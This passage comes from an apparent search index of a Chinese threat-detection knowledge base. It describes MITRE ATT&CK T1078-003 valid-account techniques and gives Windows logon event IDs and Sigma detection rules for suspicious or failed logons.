\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_4","text":"\u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#es","text":"\u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a users_list = search UserSession:Login users_grouped = group users_list by hostname users_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count multiple_logins = filter users_grouped where (latest_time - earliest_time <= 1 hour and user_count > 1) output multiple_logins","title":"es\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_6","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/","text":"T1078-003-win-\u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 VPN\u3001Citrix\u7b49\u8fdc\u7a0b\u670d\u52a1\u4ee5\u53ca\u5176\u5b83\u8bbf\u95ee\u673a\u5236\u5141\u8bb8\u7528\u6237\u4ece\u5916\u90e8\u8bbf\u95ee\u4f01\u4e1a\u5185\u90e8\u7f51\u7edc\u8d44\u6e90\u3002\u901a\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u6765\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u8fde\u63a5\u548c\u51ed\u636e\u8ba4\u8bc1\u3002Windows\u8fdc\u7a0b\u7ba1\u7406\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u6765\u521d\u59cb\u8bbf\u95ee\u7f51\u7edc\u548c/\u6216\u5728\u7f51\u7edc\u4e2d\u505c\u7559\u3002\u901a\u5e38\uff0c\u7528\u6237\u987b\u4f7f\u7528\u6709\u6548\u8d26\u53f7\u624d\u80fd\u8bbf\u95ee\u670d\u52a1\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u51ed\u636e\u6b3a\u9a97\u6216\u5165\u4fb5\u4f01\u4e1a\u7f51\u7edc\u4ece\u7528\u6237\u4fa7\u83b7\u53d6\u51ed\u636e\u7684\u65b9\u5f0f\u6765\u83b7\u5f97\u6709\u6548\u8d26\u53f7\u6743\u9650\u3002\u5728\u64cd\u4f5c\u671f\u95f4\uff0c\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u53ef\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a description: \u4ece\u516c\u5171IP\u767b\u5f55\u53ef\u80fd\u8868\u660e\u9632\u706b\u5899\u6216\u7f51\u7edc\u8fb9\u754c\u914d\u7f6e\u9519\u8bef\u3002 author: NVISO 12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5) date: 2020/05/06 tags: - attack.initial_access - attack.persistence - attack.t1078 - attack.t1190 - attack.t1133 logsource: product: windows service: security detection: selection: EventID: 4625 #\u767b\u9646\u5931\u8d25 unknown: IpAddress|contains: '-' privatev4: IpAddress|startswith: - '10.' #10.0.0.0/8 - '192.168.' #192.168.0.0/16 - '172.16.' #172.16.0.0/12 - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.' #127.0.0.0/8 - '169.254.' #169.254.0.0/16 privatev6: - IpAddress: '::1' #loopback - IpAddress|startswith: - 'fe80::' #link-local - 'fc00::' #unique local condition: selection and not (unknown or privatev4 or privatev6) falsepositives: - \u4e92\u8054\u7f51\u4e0a\u7684\u5408\u6cd5\u767b\u5f55\u5c1d\u8bd5 - IPv4\u5230IPv6\u6620\u5c04\u7684IP level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"T1078-003-win-\u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#t1078-003-win-","text":"","title":"T1078-003-win-\u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#attck","text":"VPN\u3001Citrix\u7b49\u8fdc\u7a0b\u670d\u52a1\u4ee5\u53ca\u5176\u5b83\u8bbf\u95ee\u673a\u5236\u5141\u8bb8\u7528\u6237\u4ece\u5916\u90e8\u8bbf\u95ee\u4f01\u4e1a\u5185\u90e8\u7f51\u7edc\u8d44\u6e90\u3002\u901a\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u6765\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u8fde\u63a5\u548c\u51ed\u636e\u8ba4\u8bc1\u3002Windows\u8fdc\u7a0b\u7ba1\u7406\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u6765\u521d\u59cb\u8bbf\u95ee\u7f51\u7edc\u548c/\u6216\u5728\u7f51\u7edc\u4e2d\u505c\u7559\u3002\u901a\u5e38\uff0c\u7528\u6237\u987b\u4f7f\u7528\u6709\u6548\u8d26\u53f7\u624d\u80fd\u8bbf\u95ee\u670d\u52a1\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u51ed\u636e\u6b3a\u9a97\u6216\u5165\u4fb5\u4f01\u4e1a\u7f51\u7edc\u4ece\u7528\u6237\u4fa7\u83b7\u53d6\u51ed\u636e\u7684\u65b9\u5f0f\u6765\u83b7\u5f97\u6709\u6548\u8d26\u53f7\u6743\u9650\u3002\u5728\u64cd\u4f5c\u671f\u95f4\uff0c\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u53ef\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_1","text":"windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_3","text":"\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#sigma","text":"title: \u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a description: \u4ece\u516c\u5171IP\u767b\u5f55\u53ef\u80fd\u8868\u660e\u9632\u706b\u5899\u6216\u7f51\u7edc\u8fb9\u754c\u914d\u7f6e\u9519\u8bef\u3002 author: NVISO 12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5) date: 2020/05/06 tags: - attack.initial_access - attack.persistence - attack.t1078 - attack.t1190 - attack.t1133 logsource: product: windows service: security detection: selection: EventID: 4625 #\u767b\u9646\u5931\u8d25 unknown: IpAddress|contains: '-' privatev4: IpAddress|startswith: - '10.' #10.0.0.0/8 - '192.168.' #192.168.0.0/16 - '172.16.' #172.16.0.0/12 - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.' #127.0.0.0/8 - '169.254.' #169.254.0.0/16 privatev6: - IpAddress: '::1' #loopback - IpAddress|startswith: - 'fe80::' #link-local - 'fc00::' #unique local condition: selection and not (unknown or privatev4 or privatev6) falsepositives: - \u4e92\u8054\u7f51\u4e0a\u7684\u5408\u6cd5\u767b\u5f55\u5c1d\u8bd5 - IPv4\u5230IPv6\u6620\u5c04\u7684IP level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_7","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/","text":"T1078-003-win-\u8d26\u6237\u767b\u5f55\u5931\u8d25 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u4ece\u5355\u4e00\u6e90\u7cfb\u7edf\u4f7f\u7528\u4e0d\u540c\u5e10\u6237\u767b\u5f55\u5931\u8d25 description: \u4ece\u5355\u4e2a\u6e90\u7cfb\u7edf\u68c0\u6d4b\u4f7f\u7528\u4e0d\u540c\u7528\u6237\u5e10\u6237\u7684\u53ef\u7591\u5931\u8d25\u767b\u5f55 author: 12306Br0\uff08\u7ffb\u8bd1\uff09 date: 2020/06/09 tags: - attack.persistence - attack.privilege_escalation - attack.t1078-003 logsource: product: windows service: security detection: selection1: EventID: - 529 #windows 2003 - 4625 #windows server 2008\u4ee5\u4e0a UserName: '*' #\u7528\u6237\u540d WorkstationName: '*' #\u5de5\u4f5c\u7ad9\u540d selection2: EventID: 4776 #\u9002\u7528\u4e8e\u57df\u8d26\u6237\u767b\u5f55 UserName: '*' #\u7528\u6237\u540d Workstation: '*' #\u5de5\u4f5c\u7ad9\u540d timeframe: 24h condition: - selection1 | count(UserName) by WorkstationName > 3 - selection2 | count(UserName) by Workstation > 3 falsepositives: - \u7ec8\u7aef\u670d\u52a1\u5668 - \u8df3\u677f\u670d\u52a1\u5668 - \u5176\u4ed6\u591a\u7528\u6237\u7cfb\u7edf\uff0c\u4f8b\u5982Citrix\u670d\u52a1\u5668\u573a - \u7528\u6237\u9891\u7e41\u53d8\u5316\u7684\u5de5\u4f5c\u7ad9 level: medium \u5efa\u8bae \u5efa\u8bae\u6839\u636e\u4e1a\u52a1\u7cfb\u7edf\u5b9e\u9645\u60c5\u51b5\uff0c\u8c03\u6574\u9608\u503c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"T1078-003-win-\u8d26\u6237\u767b\u5f55\u5931\u8d25"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#t1078-003-win-","text":"","title":"T1078-003-win-\u8d26\u6237\u767b\u5f55\u5931\u8d25"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_1","text":"windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_3","text":"\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#sigma","text":"title: \u4ece\u5355\u4e00\u6e90\u7cfb\u7edf\u4f7f\u7528\u4e0d\u540c\u5e10\u6237\u767b\u5f55\u5931\u8d25 description: \u4ece\u5355\u4e2a\u6e90\u7cfb\u7edf\u68c0\u6d4b\u4f7f\u7528\u4e0d\u540c\u7528\u6237\u5e10\u6237\u7684\u53ef\u7591\u5931\u8d25\u767b\u5f55 author: 12306Br0\uff08\u7ffb\u8bd1\uff09 date: 2020/06/09 tags: - attack.persistence - attack.privilege_escalation - attack.t1078-003 logsource: product: windows service: security detection: selection1: EventID: - 529 #windows 2003 - 4625 #windows server 2008\u4ee5\u4e0a UserName: '*' #\u7528\u6237\u540d WorkstationName: '*' #\u5de5\u4f5c\u7ad9\u540d selection2: EventID: 4776 #\u9002\u7528\u4e8e\u57df\u8d26\u6237\u767b\u5f55 UserName: '*' #\u7528\u6237\u540d Workstation: '*' #\u5de5\u4f5c\u7ad9\u540d timeframe: 24h condition: - selection1 | count(UserName) by WorkstationName > 3 - selection2 | count(UserName) by Workstation > 3 falsepositives: - \u7ec8\u7aef\u670d\u52a1\u5668 - \u8df3\u677f\u670d\u52a1\u5668 - \u5176\u4ed6\u591a\u7528\u6237\u7cfb\u7edf\uff0c\u4f8b\u5982Citrix\u670d\u52a1\u5668\u573a - \u7528\u6237\u9891\u7e41\u53d8\u5316\u7684\u5de5\u4f5c\u7ad9 level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_6","text":"\u5efa\u8bae\u6839\u636e\u4e1a\u52a1\u7cfb\u7edf\u5b9e\u9645\u60c5\u51b5\uff0c\u8c03\u6574\u9608\u503c\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_7","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","text":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 